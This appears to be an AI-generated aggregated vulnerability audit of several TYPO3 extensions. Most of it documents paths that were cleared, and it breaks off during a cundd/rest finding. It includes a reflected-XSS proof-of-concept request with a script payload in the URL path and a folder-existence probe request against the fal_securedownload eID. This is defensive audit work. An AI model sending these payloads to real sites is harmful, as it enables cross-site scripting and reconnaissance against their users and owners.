# TYPO3 vuln hunt — aggregated findings (with & without source)

_Autonomous run: CodeQL mass-scan + parallel agent audits + version→CVE mapping._

## Agent source-audit reports

### aoepeople_realurl

#### Security Audit: aoepeople/realurl (AOE fork)

- **Target:** `/home/user/sources/code/typo3-extensions/aoepeople_realurl`
- **Version:** `1.12.8.19.AOE` (composer `1.12.8.19`; base RealURL 1.12.8 + AOE patchset)
- **Runtime:** TYPO3 CMS `^7.6 || ^8.7`, PHP `^7.0`
- **Scope:** PRE-AUTH exploitable vulns reachable from the frontend URL decode path (attacker controls URL path + query, runs before any authentication).
- **Date:** 2026-08-04

## Summary

RealURL parses the frontend request path in `Classes/Realurl.php::decodeSpURL()` and helpers, all of which run pre-auth on the attacker-controlled URL. I traced every URL-derived value into SQL sinks, redirect/header sinks, error output, object-injection and path sinks.

**SQL injection: not present.** Every DB query that consumes a URL-derived value routes it through `$GLOBALS['TYPO3_DB']->fullQuoteStr(...)` or `intval()`. The classic RealURL alias-decode SQLi (see Known CVEs) is patched in this 1.12.8 base — the alias/uniqalias/pageAlias lookups (`lookUpTranslation`, `lookUp_uniqAliasToId`, `lookUp_idToUniqAlias`, `pageAliasToID`) and the reverse-lookup wildcard WHERE all quote the attacker value. The one raw-interpolation WHERE flagged for review (`createWildcardWhereClause`, `Pagepath.php:243`) also quotes the URL segment with `fullQuotestr`; the injected `%` wildcards are inside the quoted literal. Not injectable.

**One concrete pre-auth finding:** the raw request URL is reflected, unescaped by the extension, into the TYPO3 404 "reason" string (reflected XSS, conditional on core `pageNotFound_handling`). Open-redirect and header-injection sinks were reviewed and found protected. No object injection on the decode path (the only `unserialize` consumes admin `extConf`, not request data).

---

## Finding 1 — Reflected request URL in 404 "reason" (potential XSS)

- **SEVERITY:** Medium (conditional on TYPO3 core `pageNotFound_handling` configuration)
- **PRE-AUTH:** Yes — reached during frontend URL decode, before authentication.
- **Type:** Reflected Cross-Site Scripting / output-encoding defect.
- **Source:** attacker-controlled request path → `$speakingURIpath` (derived from `TypoScriptFrontendController->siteScript`, i.e. `REQUEST_URI`), `Classes/Realurl.php:958`.
- **Sink:** `Classes/Realurl.php:1206` builds the 404 message with the raw URL and passes it to `decodeSpURL_throw404()` → `Classes/Realurl.php:1786` `TypoScriptFrontendController::pageNotFoundAndExit($msg)`. The extension applies **no** `htmlspecialchars()` to `$msg`.

**Tainted path**

```
REQUEST_URI  →  TSFE->siteScript
             →  $speakingURIpath                         (Realurl.php:958)
             →  '"' . $speakingURIpath . '" could not be found, ...'   (Realurl.php:1206)
             →  decodeSpURL_throw404($msg)               (Realurl.php:1744)
             →  TSFE->pageNotFoundAndExit($msg)          (Realurl.php:1786)  // reason reflected by core
```

Additional sinks that reflect attacker-controlled URL fragments into the same unescaped `$msg` channel:
- `Realurl.php:1416` — reflects `$key` (URL path segment).
- `Realurl.php:1647` — reflects `$value` (URL-derived segment value).
- `Realurl.php:1685` — reflects unmapped alias `$value` (URL segment).
- `Realurl.php:1493`, `:1500`, `:1541` — reflect `$fileName` (URL-derived).

**Exploitability**

RealURL emits the raw, un-encoded attacker string. Whether it becomes executable script depends on how the host TYPO3 core version renders `pageNotFoundAndExit($reason)`:
- If `$GLOBALS['TYPO3_CONF_VARS']['FE']['pageNotFound_handling']` is unset/`false` (a common default) and the core build echoes the reason without escaping (behaviour seen in older 7.x error rendering), the payload executes.
- Modern core builds `htmlspecialchars()` the reason in `ErrorPageController`, which neutralises it.

Because the extension itself never sanitises, sites on affected core builds are exposed; this is the same defect class as the historical RealURL 404-reflection XSS advisory. Treat as a real pre-auth XSS on vulnerable core configurations and fix in the extension (defence in depth) by `htmlspecialchars()`-ing the URL before embedding it in the 404 reason.

**PoC**

```
GET /"><script>alert(document.domain)</script>/nonexistent-page HTTP/1.1
Host: victim.example
```

The path fails to resolve, `count($pathParts)` is non-zero at `Realurl.php:1205`, and the raw path (including `"><script>...`) is embedded verbatim in the 404 reason and handed to core for rendering. (Characters may be sent raw by a non-browser client; RealURL does not require them URL-encoded.)

**Remediation:** In `decodeSpURL_throw404()` and each `decodeSpURL_throw404('...')` call site, HTML-encode any request-derived value (`$speakingURIpath`, `$key`, `$value`, `$fileName`) before concatenation, and do not rely on core to escape the reason.

---

## Reviewed and NOT vulnerable (negative results)

- **SQLi — alias decode / lookup translation** (`lookUpTranslation` `Realurl.php:1954/1989/2003`, `lookUp_uniqAliasToId` `:2060`, `lookUp_idToUniqAlias` `:2099`, `pageAliasToID` `:2315`): URL alias value reaches SQL only via `fullQuoteStr($value, ...)`; `id_field`/`table`/`addWhereClause`/`languageField` are admin TypoScript `$cfg`, not URL-controlled. `$lang` from `orig_paramKeyValues` is forced through `intval()` (`:1977`). Not injectable.
- **SQLi — reverse page lookup wildcard WHERE** (`Pagepath.php:243-254`, `findPossiblePageIds` `:209`): URL `$pathSegment` is wrapped in `fullQuotestr('%'.str_replace(...).'%', ...)`. `segTitleFieldList`/`spaceCharacter` are admin config. Injected `%` stays inside the quoted literal. Not injectable. (Minor: the quote-context table arg is the typo `'pages)'`, cosmetically wrong but security-irrelevant.)
- **SQLi — cache lookups** (`Cachemgmt.php:264/266/293` path lookups; `:338/364` pid lookups): URL `$pagePath` via `fullQuoteStr`; pid via `intval`; `_getAddCacheWhere` uses `intval`-ed config. Not injectable.
- **SQLi — chash cache** (`Realurl.php:875/1898/1908`): key is `md5(...)` / `fullQuoteStr`. Not injectable.
- **SQLi — domain/root-page resolution** (`Realurl.php:1129/2578/2630`, `ConfigurationService.php:119`): `HTTP_HOST`/`host` via `fullQuoteStr`. Host header is attacker-influenced but quoted; not injectable.
- **Open redirect / header injection — protocol-wrapper redirect** (`Realurl.php:962`): `getURIpathWithoutProtocolWrapper()` (`:2918`) strips `http(s)://…` and forces a leading `/`, preventing off-site redirect. `header()` blocks CRLF injection in supported PHP. Not exploitable.
- **Open redirect — appendMissingSlash redirect** (`Realurl.php:1007`) and postVar failure redirect (`:1409`): targets are relative, guarded by `parse_url(..., PHP_URL_HOST)` check (`:1004`) and routed through `GeneralUtility::locationHeaderUrl()`. Not an open redirect.
- **Config `redirects`/`redirects_regex`** (`Realurl.php:1091-1113`): redirect targets come from admin TypoScript, not the URL. Not attacker-controlled.
- **Object injection**: the only `unserialize` (`Realurl.php:205`) consumes `TYPO3_CONF_VARS['EXT']['extConf']['realurl']` (admin ext config), not request data. `callUserFunction` sinks (`:353,520,702,974,1320,1678,2238,2267`) invoke admin-configured `userFunc` names, not URL-controlled class strings. No pre-auth object injection.
- **Path traversal — file handling** (`Realurl.php:1490-1541`): `$fileName` is matched against configured `fileName.index`/`defaultToHTMLsuffixOnPrev` config and existence-checked; no filesystem read/include of the raw segment. Reflection only (covered by Finding 1).
- **Cache poisoning**: decode cache rows are keyed by resolved page id + quoted path with `intval`-ed root/language scoping; error-log writes (`:1752-1779`) store the URL as data via `exec_INSERTquery`/parameterised arrays. No unauthenticated write of a poisoned executable value observed.

---

## Known CVEs / advisories cross-reference (vs. 1.12.8.19)

- **SQL injection in EXT:realurl** (TYPO3-EXT-SA advisories for RealURL; fixed by quoting alias values in the id/alias lookup functions in the 1.12.7 / 2.0.x line): **PATCHED here** — all alias, uniqalias and page-alias lookups use `fullQuoteStr`. Base version 1.12.8 is past the fix.
- **XSS via reflected request URL in RealURL error/404 output** (historical RealURL reflected-URL advisory class): **Extension still emits the raw URL unescaped** (Finding 1). Residual exposure depends on the host TYPO3 core's `pageNotFound_handling` rendering; recommend fixing in-extension.
- No evidence this fork re-introduces the patched SQLi; the AOE patchset (reverse page-id lookup in `Pagepath.php`) also quotes its URL input.

## Recommendation

Escape all request-derived strings before embedding them in `decodeSpURL_throw404()` messages (Finding 1). No SQLi, object-injection, open-redirect, or path-traversal defects were found on the pre-auth decode path in this version.

### apache-solr-for-typo3_solr

#### Security Audit — apache-solr-for-typo3/solr (ext-solr)

- **Target:** `/home/user/sources/code/typo3-extensions/apache-solr-for-typo3_solr`
- **Version:** `14.0.0-RC1` (from `composer.json`; no `ext_emconf.php` present)
- **Scope:** Pre-auth exploitable source→sink vulns in Routing (URL facets), search request handling, eID handlers, the unauthenticated frontend search/suggest plugins, and DB repositories under `Classes/Domain/...` and `Classes/System/Records/...`.
- **Date:** 2026-08-04
- **Auditor focus caveat honored:** `->query()/setQuery()/search()` against the Solr connection are NOT SQL. Only TYPO3 QueryBuilder / raw DB `where()` with attacker input were considered for SQLi.

## Summary

No concrete pre-auth exploitable vulnerability (SQLi, XSS, object injection, path traversal, SSRF, code injection) was found in the audited code paths for this version. The historically sensitive spots — the unauthenticated suggest endpoint and the frontend DebugWriter — are remediated/gated in 14.x. The routing/URL-facet layer is pure string manipulation with no injection sink. All database repositories use parameterized TYPO3 QueryBuilder (`createNamedParameter`, `Connection::PARAM_*`, `intval` casting) with no string concatenation into `where()`. The eID API handler is gated by a secret-derived key and dispatches only whitelisted methods. Findings below are all defensively-analyzed non-issues or low-severity items that are NOT pre-auth reachable; they are documented for completeness.

---

## Cleared / analyzed items (no pre-auth exploit)

### A. eID `tx_solr_api` dynamic method dispatch — NOT exploitable
- **File:** `Classes/Eid/ApiEid.php:58` — `$this->{'get' . ucfirst($request->getQueryParams()['api']) . 'Response'}($request)`
- **Source:** `?api=` query param (attacker-controlled), registered at `ext_localconf.php:99` as unauthenticated eID `tx_solr_api`.
- **Why safe:**
  1. `validateRequest()` (line 82) first requires a valid API key: `Api::isValidApiKey($params['apiKey'])`. Key = `sha1($GLOBALS['TYPO3_CONF_VARS']['SYS']['encryptionKey'] . 'tx_solr_api')` (`Api.php:39`). Without the site `encryptionKey` (a secret) the key cannot be forged → **not pre-auth**.
  2. `validateRequest()` also enforces `array_key_exists($params['api'], self::API_METHODS)` (line 95), and `API_METHODS` only contains `siteHash`. The dynamic method name is therefore constrained to `getSiteHashResponse` — no arbitrary method invocation. Not a constant-callback FP concern because the whitelist is enforced before dispatch.

### B. Routing / URL facet handling — string-only, no injection sink
- **Files:** `Classes/Middleware/SolrRoutingMiddleware.php`, `Classes/Routing/RoutingService.php`, `Classes/Routing/UrlFacetService.php`
- The middleware runs pre-auth on the frontend and converts URL path segments into `tx_solr[...]` query parameters (`process()`, `extractParametersFromUriPath()`, `addPathArgumentsToQuery()`, `processUriPathArgument()`). Every operation is `explode/implode/substr/str_replace/urldecode/array_map`. The `array_map([$service, 'decodeSingleValue'/'encodeSingleValue'/'applyCharacterMap'])` callbacks (`RoutingService.php:221,249,572,608,662,663,691`) resolve to fixed methods on `UrlFacetService` (verified constant callbacks, not attacker-selected callables) that only do `str_replace`/`urldecode`. No `unserialize`, no DB access, no `eval`, no dynamic callable from request. Output is written back as query params consumed by Extbase (Fluid auto-escapes) and by Solr (escaped, see D). **No sink.**

### C. Unauthenticated Suggest plugin (`pi_suggest`) — output is escaped
- **Files:** `Classes/Controller/SuggestController.php`, `Classes/Domain/Search/Suggest/SuggestService.php`
- Reachable pre-auth (frontend plugin, `ext_localconf.php:208-215`).
- User query is escaped at the boundary: `SuggestController.php:43` `$rawQuery = htmlspecialchars(mb_strtolower(trim($queryString)))`, and `SuggestController.php:57` `$additionalFilters = array_map('htmlspecialchars', $additionalFilters)`.
- The reflected `suggestion` field (`SuggestService.php:250` `getRawUserQuery()`) and suggestion keys (`getSuggestionArray()`, built from the already-escaped query + Solr-index-derived strings) therefore carry no raw request markup. Response is `json_encode(...)`. This matches the fix for the historical suggest-reflection XSS. **No per-request reflected XSS.**

### D. Solr filter value insertion — Solr-side, not SQLi, low risk
- **File:** `Classes/Search/FacetingComponent.php:187` — `$filterParts[] = $facetConfiguration['field'] . ':' . $filterValue;` where `$filterValue` derives from `tx_solr[filter]` (`:204` `array_map('rawurldecode', $resultParameters['filter'])`).
- The field name is not attacker-chosen freely: the facet name must match a configured facet (`getFacetNamesWithConfiguredField()`) and `field` comes from TypoScript config. The value is decoded by the facet's `filterEncoder->decode()`. The resulting string is added as a **Solr** filter query (`AbstractQueryBuilder.php:262 addFilterQuery`). This is a Solr query, explicitly out of the SQLi scope; at worst it is Solr filter-query manipulation against a read-only search core (broadening/narrowing results), which upstream treats as accepted behavior. Not a SQL injection and not a memory/RCE sink. **Noted, not a DB vuln.**

### E. `unserialize()` in event queue worker — NOT pre-auth
- **File:** `Classes/Task/EventQueueWorkerTask.php:87` — `$event = unserialize($queueItem['event'])`.
- Source is the `tx_solr_eventqueue_item` DB table, populated by the record-monitoring/indexing pipeline (backend editor/admin data changes), and consumed by a Scheduler task (CLI/backend). It is not reachable from an unauthenticated frontend request, and writing arbitrary serialized payloads to that column requires DB write access. **Object-injection primitive exists but is not pre-auth reachable** → informational only.

### F. Frontend DebugWriter `echo` — gated, not pre-auth
- **File:** `Classes/System/Logging/DebugWriter.php:100` — `echo $message . ':<br/>';` then `DebuggerUtility::var_dump()`.
- Guarded by `getIsAllowedByDevIPMask()` (caller IP must match `SYS/devIPmask`) AND `getLoggingDebugOutput()` config being enabled (`write()` lines 43-51). `$message` is developer log text, not directly a request parameter. Requires dev-IP + explicit debug config → not a general pre-auth XSS.

### G. `HighlightResultViewHelper` `call_user_func` — not request-controlled
- **File:** `Classes/ViewHelpers/Document/HighlightResultViewHelper.php:60` — `call_user_func([$document, 'get' . $fieldName])`. `$fieldName` is a Fluid template argument set by the site integrator, not a request parameter, and output passes through `escapeEverythingExceptAllowedTags()` (htmlspecialchars). Not attacker-controlled.

### H. Database repositories — parameterized, no SQLi
- **Files:** `Classes/System/Records/**` (`AbstractRepository`, `PagesRepository`, `EventQueueItemRepository`, `SystemCategoryRepository`, `SystemTemplateRepository`), `Classes/Domain/Index/Queue/**` (`QueueItemRepository`, `QueueStatisticsRepository`, `ConfigurationAwareRecordService`), `Classes/ContentObject/Relation.php`.
- All `where()/andWhere()` clauses use `createNamedParameter(...)` / `expr()->eq|in|notLike(...)` / `quoteIdentifier(...)`, and list inputs are sanitized with `array_map('intval', ...)`. Grep for string concatenation into `where()` (`'.$var` / `$var.'`) returned **zero** matches. `quoteIdentifier()` targets are constant column names, not request input. No `exec_SELECT*`, no raw SQL. **No SQLi.**

### I. SSRF / path traversal / code-injection primitives — none with request input
- No `file_get_contents/fopen/readfile/include/require/curl_exec/RequestFactory` fed by request data in the audited paths.
- `parse_str` uses (`AbstractSolrService.php:360`, `UrlHelper.php:30,51`, `PostEnhancedUriProcessor.php:53`) all parse internally-constructed URLs/queries into a local array (two-arg form, no global overwrite). No `eval/create_function/assert/preg_replace-e/$$`.

---

## Known CVEs / advisories cross-reference

- ext-solr has had TYPO3 security advisories historically in the **suggest/search reflection** area (Cross-Site Scripting via the unauthenticated suggest eID/plugin echoing the raw query). In `14.0.0-RC1` this is remediated: `SuggestController::suggestAction()` applies `htmlspecialchars()` to both `$queryString` and each `additionalFilters` entry before use (see finding C). No unpatched match found.
- No known SQL-injection CVE applies: the DB layer is fully parameterized (finding H).
- Note: `14.0.0-RC1` is a **release candidate**. Confirm the final GA and any advisories published after the assistant knowledge cutoff (Jan 2026) via the TYPO3 security advisories feed / `TYPO3-Solr/ext-solr` releases before production use.

## Verdict

No actionable pre-auth source→sink vulnerability identified in the audited scope for this version.

### beechit_default-upload-folder

#### Security Audit — beechit/default_upload_folder

- Extension key: `default_upload_folder`
- Version: 3.0.0 (`ext_emconf.php`)
- Platform: TYPO3 v12.4 / v13.4
- Scope: path traversal / folder escape in the computed upload path from request
  data, injection

## Summary

No concrete vulnerability found, and no pre-auth surface exists. The extension is a
**backend-only** event listener (`AfterDefaultUploadFolderWasResolvedEvent`) that
runs inside an authenticated TYPO3 backend user session. The computed sub-folder is
sourced entirely from **Page TSconfig and User TSconfig** (integrator/admin-
controlled), never from HTTP request parameters. Folder resolution and creation go
through FAL (`ResourceFactory`, `ExtendedFileUtility`), which normalise paths and
enforce storage/filemount permissions.

## Entry point / data flow

- Entry: `DefaultUploadFolder::__invoke(AfterDefaultUploadFolderWasResolvedEvent)`
  (`Classes/EventListener/Backend/DefaultUploadFolder.php:26`). This event fires
  during backend file-upload/FormEngine handling — it requires an authenticated
  `$GLOBALS['BE_USER']` (used directly at `:34`). **Not reachable pre-auth.**
- Path source: `$subFolder` is read from
  `BackendUtility::getPagesTSconfig($pid)` and `$GLOBALS['BE_USER']->getTsConfig()`
  under the `default_upload_folders.` key
  (`:33-45`, `getDefaultUploadFolderForTableAndField/ForTable/ForAllTables`,
  `:127-194`). `$table`/`$field`/`$pid` come from the event, and are only used as
  **array keys** to look up an admin-defined TSconfig value — they are not
  concatenated into the path.

## Findings (attack classes disproven)

### 1. Folder escape / path traversal from request data — NOT VULNERABLE
- SEVERITY: n/a  PRE-AUTH: no (backend, authenticated)
- The upload path string is not built from request input. It is a TSconfig value.
  The only request-influenced values (`$table`, `$field`, `$pid`) select *which*
  TSconfig entry applies; they never become path segments. To place a traversal
  string one must already be able to write Page/User TSconfig, which is an
  admin/integrator privilege.
- Sinks are FAL-mediated and permission-checked:
  `ResourceFactory::getFolderObjectFromCombinedIdentifier($subFolder)`
  (`:51`, `:113`) which catches `InsufficientFolderAccessPermissionsException`
  (`:56` → returns null), and folder creation via
  `ExtendedFileUtility` with `setActionPermissions()` (`:109-111`), which enforces
  the BE user's filemount/storage permissions. The subfolder-append branch
  `$uploadFolder->getSubfolder($subFolder)` (`:61-63`) operates on a resolved FAL
  `Folder`, whose driver normalises `..` and confines access within the storage.

### 2. Injection (date-format placeholder replacement) — NOT VULNERABLE
- `checkAndConvertForDateFormat()` (`:203-224`) only performs a fixed
  `str_replace` of `{Y}{y}{m}{n}{j}{d}{W}{w}` with `date()` output on an
  admin-supplied TSconfig string. No `eval`, no shell, no dynamic key from request.

## Cross-reference

No public TYPO3-EXT-SA is known for this widely-used extension at v3.0.0 for the
reviewed listener. Assessment from source review.

## Conclusion

Not exploitable: backend-authenticated context, upload path derived from
admin-controlled TSconfig (not request data), and all filesystem operations routed
through permission-enforcing FAL APIs. No path traversal or injection.

### beechit_fal-securedownload

#### Security Audit — beechit/fal_securedownload v6.0.3

**Target:** `/home/user/sources/code/typo3-extensions/beechit_fal-securedownload` (v6.0.3, `typo3/cms-core: ^13.4`, PHP ^8.2)
**Scope:** pre-auth arbitrary file read via the secure-download / dump path and the `FalSecuredownloadFileTreeState` eID — access-control bypass, path traversal, forgeable token.
**Date:** 2026-08-04

## Summary / Verdict

**No pre-auth arbitrary file read found in v6.0.3.** The three target hypotheses were traced request-parameter → sink and **disproven**:

1. **Access-control bypass — NOT FOUND.** The FE download flow delegates to TYPO3 core's `FileDumpController` (core eID `dumpFile`), which dispatches `ModifyFileDumpEvent`. This extension's `ModifyFileDumpEventListener` runs on that event **on every dump** and enforces FE-group access via `CheckPermissions` before the file is streamed; on denial it hard-`exit`s (401/403). An anonymous request resolves to `userFeGroups = false`, and `matchFeGroupsWithFeUser()` denies any folder/file that carries a non-empty `fe_groups` restriction. The listener is unconditionally registered (`Services.yaml`), so there is no code path that streams a protected file without the check.

2. **Path traversal — NOT FOUND.** Every file-serve sink dereferences an **integer file UID**, never an attacker-supplied path. `DownloadLinkViewHelper`/core pass `f=<uid>` / `p=<uid>`; the sinks are `ResourceStorage::streamFile($file)` and `$file->getForLocalProcessing()` where `$file` came from `ResourceFactory::getFileObject((int)$uid)` / `ProcessedFileRepository::findByUid()`. No `readfile`/`PATH_site.$x`/`getFileAbsFileName()` on request input; the FAL driver confines identifiers to the storage root. No `../` reaches a filesystem read.

3. **Forgeable / predictable token — NOT FOUND.** FE token = `HashService::hmac('dumpFile|<t>|<uid>', 'resourceStorageDumpFile')`; BE token = `HashService::hmac(..., 'BeResourceStorageDumpFile')`. `HashService` keys the HMAC with the site `encryptionKey`. Not forgeable/predictable without server secret. Core rejects a bad `token` with 403 before dispatching the dump event.

The extension is current (TYPO3 v13) and actively maintained, not the vulnerable legacy `dumpFile`-in-extension design of the 1.x/2.x line. No TYPO3 security advisory is published specifically for this extension.

## Full request→sink map (all file-serve routes gated)

| Route | Auth/token gate | Access check | Sink |
|---|---|---|---|
| FE `?eID=dumpFile&t=f&f=<uid>&token=<hmac>` | core `FileDumpController` validates `token` (encryptionKey HMAC) | `ModifyFileDumpEventListener::checkFileAccess` → `CheckPermissions::checkFileAccess` (folder rootline + file `fe_groups`) | `ResourceStorage::streamFile` / `getForLocalProcessing` (`ModifyFileDumpEventListener.php:187,208`) |
| BE ajax `ajax_dump_file` (`/typo3/…/fal_securedownloads/dump_file`) | Backend route ⇒ requires BE session **and** `fal_token` HMAC (`BeResourceStorageDumpFile`) | `getStorage()->checkFileActionPermission('read', $orgFile)` (`BePublicUrlController.php:86`) | `streamFile` (`BePublicUrlController.php:92`) |
| FE `?eID=FalSecuredownloadFileTreeState` | `EidFrontendAuthentication` middleware sets FE-user aspect | (none — non-file action) | session write only, no file bytes returned |

## Findings (concrete, lower severity — not pre-auth file read)

### F1 — Unauthenticated folder-existence oracle + arbitrary session-key write via `FalSecuredownloadFileTreeState` eID
- **SEVERITY:** Low. **PRE-AUTH:** Yes (anonymous session).
- **Source:** `folder` request param → `FileTreeStateController::saveLeafState` (`Classes/Controller/FileTreeStateController.php:62-69`).
- **Sink:** `LeafStateService::saveLeafStateForUser` → `ResourceFactory::getFolderObjectFromCombinedIdentifier($folder)` (`Classes/Service/LeafStateService.php:49`), then writes `$folderState[$folder]=true` into the FE user/session store (`:93`).
- **Tainted path:** fully attacker-controlled combined identifier `<storage>:<path>`, no permission check.
- **Exploitability:** Does **not** return file contents. A valid vs. invalid folder yields different responses (existing folder → `{}`/200 and a session entry; non-existent → `FolderDoesNotExistException`/500, or 404 on empty), giving a folder-existence oracle across all storages. Also lets an anonymous visitor write arbitrary keys/growth into their own session record. No cross-user impact, no file disclosure.
- **PoC:** `GET /index.php?eID=FalSecuredownloadFileTreeState&folder=1:/secret/&open=1` vs `folder=1:/does-not-exist/` and compare status/exception.

### F2 — `unserialize()` of session-stored leaf state
- **SEVERITY:** Informational. **PRE-AUTH:** No practical attacker channel.
- **Location:** `LeafStateService::getFolderState` — `unserialize($folderStates)` (`Classes/Service/LeafStateService.php:81`) without `['allowed_classes' => false]`.
- **Analysis:** The value is written only by `saveFolderState` (`serialize(array)`) into the server-side FE session store; the client cannot inject raw bytes there. Not exploitable as object injection under normal TYPO3 session handling. Flagged only for hardening (mirror the `allowed_classes => false` used in `EidFrontendAuthentication::unpackUc`).

### F3 — Substring group match in `matchFeGroupsWithFeUser`
- **SEVERITY:** Informational. **PRE-AUTH:** No (requires login).
- **Location:** `CheckPermissions::matchFeGroupsWithFeUser` — `if (str_contains($groups, '-2')) return true;` (`Classes/Security/CheckPermissions.php:311`).
- **Analysis:** Intended to grant "any logged-in user" when the special group `-2` is present. `str_contains` is a loose substring test, but stored `fe_groups` CSVs only ever hold positive fe_group UIDs plus the sentinel `-2`, so no real UID string contains `-2`. Reached only after the `$userFeGroups === false` (not-logged-in) early return, so it cannot help an anonymous request. Not exploitable; noted for correctness (prefer exact CSV membership).

## Known CVEs / Advisories
- No TYPO3 security advisory is published for `beechit/fal_securedownload` itself (checked typo3.org security advisories / Packagist).
- Related **core** FAL advisories affect the fallback storage, not this extension's gate: **TYPO3-CORE-SA-2026-013** (Broken Access Control, Media Module fallback storage) and **CVE-2024-25121 / GHSA-rj3x-wvc6-5j66** (FAL entities persisted via DataHandler referencing fallback storage). These are core-side; v6.0.3's own dump path is unaffected and correctly delegates to core `FileDumpController`.

## Conclusion
The download/dump path and the `FalSecuredownloadFileTreeState` eID were traced end-to-end. Access control is enforced on every file-serving sink, file identity is by integer UID (no traversal), and tokens are encryptionKey-keyed HMACs (not forgeable). **No unpatched pre-auth arbitrary file read exists in v6.0.3.** Only the low/informational items F1–F3 above are concrete.

### brezo-it_multi-file-upload

#### Security Audit — brezo-it/multi_file_upload

- Extension key: `multi_file_upload`
- Version: 1.2.0 (`ext_emconf.php`)
- Platform: TYPO3 v13.4 / v14, `typo3/cms-form` (Form Framework element/finisher package)
- Scope: unrestricted upload / RCE, path traversal in target filename/dir, missing auth on upload endpoint

## Summary

No concrete pre-auth vulnerability found. The extension is a thin layer on top of
the TYPO3 Form Framework: it adds a `MultiFileUpload` form element, two custom
`TypeConverter`s that delegate the actual file persistence to the **core**
`TYPO3\CMS\Form\Mvc\Property\TypeConverter\UploadedFileReferenceConverter`, plus a
mail/attach finisher. All file-writing, filename sanitisation and extension
deny-listing remain in core code; the extension introduces no independent file
sink, no eID/AJAX endpoint, and no request-controlled upload path.

## Entry point / data flow

- Entry: standard Form Framework submission (frontend, may be anonymous by design).
  There is **no eID or AJAX route** — `ext_localconf.php` only registers the
  `ext/form` `afterBuildingFinished` / `afterFormStateInitialized` hooks and YAML.
- Sink (upload): `MultiUploadedFileReferenceConverter::convertFiles()`
  (`Classes/Mvc/Property/TypeConverter/MultiUploadedFileReferenceConverter.php:49-68`)
  iterates the uploaded-files array and calls
  `GeneralUtility::makeInstance(UploadedFileReferenceConverter::class)->convertFrom($item, FileReference::class, ...)`.
  The write, unique-name generation and the `fileDenyPattern` enforcement all
  happen inside that core converter → core `ResourceStorage::addUploadedFile()`.

## Findings (attack classes disproven)

### 1. Unrestricted upload / .php → RCE — NOT VULNERABLE
- PRE-AUTH: form can be public, but no bypass exists.
- The extension never chooses/writes a filename itself. Persistence is delegated to
  core `UploadedFileReferenceConverter` (`MultiUploadedFileReferenceConverter.php:61`,
  `SingleUploadedFileReferenceConverter.php:43/50`), which routes through
  `ResourceStorage`, applying `$GLOBALS['TYPO3_CONF_VARS']['BE']['fileDenyPattern']`
  (blocks `php`, `phtml`, `.htaccess`, etc.) plus `sanitizeFileName()`. Optional
  per-form `allowedMimeTypes` validators are configured by the form editor and run
  in addition. No executable-extension bypass is introduced here.

### 2. Path traversal in upload folder / filename — NOT VULNERABLE
- Upload folder is the form-element property `saveToFileMount`
  (`MultiFilePropertyMappingConfiguration.php:52`), set by a backend form author, and
  is validated before use by `checkSaveFileMountAccess()`
  (`MultiFilePropertyMappingConfiguration.php:121-139`): it rejects extension paths
  (`PathUtility::isExtensionPath`) and requires a resolvable FAL combined identifier
  (`getFolderObjectFromCombinedIdentifier`). The `uploadSeed` is the form **session
  identifier** (`:91-115`), not attacker input. No request parameter reaches the
  folder path; the target filename is generated by core, not by the request.

### 3. Missing auth on an upload endpoint — NOT APPLICABLE
- There is no custom endpoint. Submission goes through the Form Framework runtime
  (CSRF/HMAC-protected form state). `MultiUploadedResourceViewHelper` protects
  re-submitted resource pointers with an HMAC
  (`HashService::appendHmac(..., HashScope::ResourcePointer->prefix())`,
  `MultiUploadedResourceViewHelper.php:88`), so an attacker cannot forge a
  `submittedFile.resourcePointer` to attach an arbitrary existing sys_file.

### 4. IDOR file deletion via `<property>__delete[uid]` — NOT VULNERABLE
- `MultiUploadedFileReferenceConverter::applyDeletions()` and
  `UploadDeleteRequest::getMarkedFileUids()` only `detach()` a FileReference from the
  in-memory `MultiFile` storage (form value); nothing is `unlink`ed from disk
  (`MultiUploadedFileReferenceConverter.php:104-125`, `UploadDeleteRequest.php`).
  The deletion set is filtered to UIDs already present in the current form value
  (`:114-120`), so a foreign UID has no effect. No `unlink`/`delete()` sink exists.

## Cross-reference

No public TYPO3 security advisory (TYPO3-EXT-SA) is known for this extension/version
for the reviewed classes. Assessment is based on source review of v1.2.0.

## Conclusion

No path traversal, unrestricted upload, or missing-auth vulnerability. Security
depends on unchanged TYPO3 core file-upload controls (fileDenyPattern, FAL
permissions, Form Framework HMAC), which this extension correctly reuses.

### cundd_rest

#### Security Audit — `cundd/rest` (TYPO3 REST API extension)

- **Target:** `/home/user/sources/code/typo3-extensions/cundd_rest`
- **Version:** 5.1.0 (`ext_emconf.php`), TYPO3 constraint `9.5.0 – 11.5.99`
- **Scope:** PRE-AUTH exploitable vulnerabilities reachable through the `rest` eID handler / PSR-15 `RestMiddleware`.
- **Date:** 2026-08-04

## Summary

The extension exposes an unauthenticated HTTP surface at `/rest/…`, entered via the
PSR-15 `RestMiddleware` (TYPO3 v9+) or the `eID=rest` / `BootstrapDispatcher` path (v8).
I traced the full request path: `RestMiddleware` → `Dispatcher::processRequest` →
`RequestFactory::buildRequest` (URL → `ResourceType`) →
`ConfigurationBasedAccessController::getAccess` (access decision) → `CrudHandler`/`AuthHandler`
→ `DataProvider` / `VirtualObject` persistence → `QueryBuilder`/Doctrine.

**The extension is secure-by-default and well hardened.** I found **no pre-auth memory/logic
vulnerability that is exploitable in the default configuration.** The critical sinks are
correctly defended:

- **Access control fails closed.** Out of the box (`ext_typoscript_setup.txt`, auto-loaded
  globally by TYPO3) the catch‑all resource `all` is `read=deny / write=deny`, and any
  resource with no matching path config throws `InvalidAccessConfigurationException` → no
  handler runs. Only `greeting` (static text) and `auth/login` (login endpoint) are reachable
  unauthenticated by design.
- **No SQL injection.** The VirtualObject SQL layer parameterises all WHERE *values*
  (bound params), validates table names (`ctype_alnum` + `_`), column names
  (`InvalidColumnNameException::assertValidColumnName`), ordering direction, and casts
  limit/offset to `int`. Column names are resolved only from admin TypoScript mapping, never
  free-form user input. Standard Extbase repositories (`findByUid`, `findOneBy*`) are used
  for the default handler.
- **No PHP object injection.** Request bodies are parsed with `json_decode(...)` /
  `getParsedBody()` (`Request::decodeSentData`). The only `unserialize()` operates on
  `$GLOBALS['TYPO3_CONF_VARS']['EXT']['extConf']['rest']` (extension config, not attacker input).
- **No SSRF, path traversal, or arbitrary file access** in the request path.
- CORS reflection is safe (exact allow-list match only).

The two findings below are a low-severity hardening gap in the login endpoint and a
configuration footgun (`read=allow` without login) that turns the CRUD handler into a mass
data-disclosure primitive. Both are noted honestly with their reachability caveats.

---

## Finding 1 — Unauthenticated API-key brute force; plaintext API keys, no throttling

- **SEVERITY:** Low
- **PRE-AUTH:** Yes (reachable in default config)
